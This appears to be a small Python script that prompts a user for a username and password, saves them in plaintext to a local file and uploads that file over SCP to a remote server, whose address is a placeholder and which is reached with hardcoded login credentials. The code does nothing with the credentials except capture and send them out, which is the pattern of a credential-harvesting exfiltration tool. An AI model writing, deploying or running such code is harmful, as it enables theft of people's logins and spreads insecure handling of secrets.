from paramiko import SSHClient
from scp import SCPClient
import time
ssh = SSHClient()
ssh.load_system_host_keys()
ssh.connect('server_ip',username="username",password="password") # scp connect
scp = SCPClient(ssh.get_transport())


username=input("Enter your username : ")
pword=input("Enter your password : ")
with open(r"C:\Users\cswil\Desktop\hashprog\creds\credits.txt","w") as f:
    f.write(username + "\n"+pword) # wrte username and password
    f.close()
scp.put(r'C:\Users\cswil\Desktop\hashprog\creds\credits.txt', recursive=True, remote_path='/home/nemo/hashit/sends') # send the file
